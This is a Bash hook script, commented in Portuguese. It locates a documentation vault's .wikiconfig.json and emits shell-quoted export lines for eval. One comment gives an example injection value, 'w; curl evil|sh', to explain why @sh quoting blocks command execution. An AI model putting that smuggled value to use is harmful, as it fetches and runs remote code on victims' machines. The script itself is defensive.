#!/bin/bash
# =============================================================================
# wiki-detect.sh — resolvedor de vault do pipeline de documentação global
# =============================================================================
# Sobe a árvore a partir de um cwd procurando .wikiconfig.json (marcador de
# vault). Se achar, emite os paths daquele vault. Se não achar nenhum, cai no
# fallback global (~/.claude/wiki/default.json → vault pessoal).
#
# Uso:  eval "$(bash ~/.claude/hooks/wiki-detect.sh "$CWD")"
# Emite linhas `export WIKI_*=...` (ou WIKI_VAULT_ID=none se sem jq).
#
# É puro e idempotente: nunca escreve nada, nunca falha o chamador (só emite).
# =============================================================================
set -euo pipefail

CWD="${1:-$PWD}"
DEFAULT="$HOME/.claude/wiki/default.json"
JQ=$(command -v jq || echo /usr/bin/jq)

if [ ! -x "$JQ" ]; then echo "export WIKI_VAULT_ID=none"; exit 0; fi

# Emite os exports a partir de um config + a raiz absoluta do vault.
#
# Todo valor passa por @sh. Sem isso, um vault com espaço no path emitia
# `export WIKI_ROOT=/a/va lt/wiki`, e o `eval` do chamador morria em exit 1
# silencioso — nenhuma mudança era logada mais naquele vault. Pior: como isto
# é `eval` de conteúdo de .wikiconfig.json, um vault de terceiro com
# `"wiki": "w; curl evil|sh"` executava comando arbitrário. @sh fecha os dois.
emit() {
  "$JQ" -r --arg root "$2" '
    "export WIKI_VAULT_ID="   + ((.id   // "unknown") | @sh),
    "export WIKI_VAULT_ROOT=" + ($root                | @sh),
    "export WIKI_ROOT="       + ($root + "/" + .wiki  | @sh),
    "export WIKI_RAW="        + ($root + "/" + .raw   | @sh),
    "export WIKI_INDEX="      + ($root + "/" + .index | @sh),
    "export WIKI_LOG="        + ($root + "/" + .log   | @sh),
    "export WIKI_INBOX="      + ($root + "/" + .inbox | @sh),
    "export WIKI_LANG="       + ((.lang // "pt-BR")   | @sh),
    "export WIKI_CONFIG="     + ($root + "/.wikiconfig.json" | @sh)
  ' "$1"
}

# 0) Emitir SEMPRE as raízes dos dois vaults conhecidos — ANTES de qualquer saída.
#
# O vault de destino NÃO se decide pelo cwd: decide-se pelo conteúdo de cada
# aprendizado, na ingestão. A mesma sessão num produto gera as duas lentes — o
# padrão generalizável vai para o pessoal, o SSOT operacional vai para a empresa,
# e uma linka a outra. Este passo garante que o /ingerir tenha os dois endereços
# à mão mesmo quando o cwd já está dentro de um vault (senão o passo 1 sai antes
# e a sessão fica presa a um só destino, que foi o bug original).
VAULTS="$HOME/.claude/wiki/vaults.json"
if [ -f "$VAULTS" ]; then
  "$JQ" -r --arg reg "$VAULTS" '
    (.vaults[] | select(.cunho == "pessoal") | "export WIKI_VAULT_PESSOAL=" + (.raiz | @sh)),
    (.vaults[] | select(.cunho == "empresa") | "export WIKI_VAULT_EMPRESA=" + (.raiz | @sh)),
    "export WIKI_VAULTS_REGISTRO=" + ($reg | @sh)
  ' "$VAULTS" 2>/dev/null || true
fi

# 1) Subir procurando marcador de vault
d="$CWD"
while [ -n "$d" ] && [ "$d" != "/" ]; do
  if [ -f "$d/.wikiconfig.json" ]; then
    emit "$d/.wikiconfig.json" "$d"
    exit 0
  fi
  d=$(dirname "$d")
done

# 2) Fallback global
if [ -f "$DEFAULT" ]; then
  ROOT=$("$JQ" -r '.root' "$DEFAULT")
  # para o fallback, WIKI_CONFIG aponta pro próprio default.json (também quotado)
  DEFAULT_SH=$("$JQ" -rn --arg p "$DEFAULT" '$p | @sh')
  emit "$DEFAULT" "$ROOT" | sed "s#^export WIKI_CONFIG=.*#export WIKI_CONFIG=$DEFAULT_SH#"
else
  echo "export WIKI_VAULT_ID=none"
fi

